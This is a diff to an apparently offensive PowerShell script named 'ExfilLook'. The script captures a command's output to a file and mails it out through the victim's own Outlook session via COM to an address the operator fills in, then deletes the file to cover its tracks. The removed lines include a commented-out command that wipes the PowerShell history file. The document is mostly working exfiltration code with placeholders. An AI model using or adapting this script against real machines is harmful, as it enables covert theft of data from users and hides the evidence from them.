@@ -73,12 +73,12 @@ if ($outlook.Session.Accounts.Count -gt 0) {
 # ------------------------------------------------------------------------------------ 
 
 # Define the file path and name
-$filePath = "{PATH}\{FILENAME}.txt"
+$filePath = "PATH\FILENAME.txt" # FILL OUT
 
 # Create a new text file
 New-Item -ItemType File -Path $filePath -Force
 
-{COMMAND} > "{PATH}\{FILENAME}.txt"
+COMMAND > "PATH\FILENAME.txt" # FILL OUT
 
 # ------------------------------------------------------------------------------------ 
 
@@ -88,10 +88,10 @@ New-Item -ItemType File -Path $filePath -Force
 $ATTACHMENT = "{PATH}\{FILENAME}.txt"
 $outlook = New-Object -comobject outlook.application
 $email = $outlook.CreateItem(0)
-$email.To = "{EMAIL}"
-$email.Subject = "ExfilLook"
-$email.Body = "Proof of Concept"
-$email.Attachments.add($ATTACHMENT)
+$email.To = "EMAIL" # FILL OUT
+$email.Subject = "ExfilLook" # CHANGE (Optional)
+$email.Body = "Proof of Concept" # CHANGE (Optional)
+$email.Attachments.add($ATTACHMENT) | Out-Null
 $email.Send()
 $outlook.Quit()
 # ------------------------------------------------------------------------------------ 
@@ -100,10 +100,4 @@ $outlook.Quit()
 # ------------------------------------------------------------------------------------ 
 
 del $HOME/FILENAME.txt
-#Remove-Item (Get-PSReadlineOption).HistorySavePath; exit
-
-# ------------------------------------------------------------------------------------ 
-
-# - ADDITIONAL COMMANDS
-# - Check PowerShell History: Get-Content (Get-PSReadlineOption).HistorySavePath
-# ------------------------------------------------------------------------------------ 
+exit
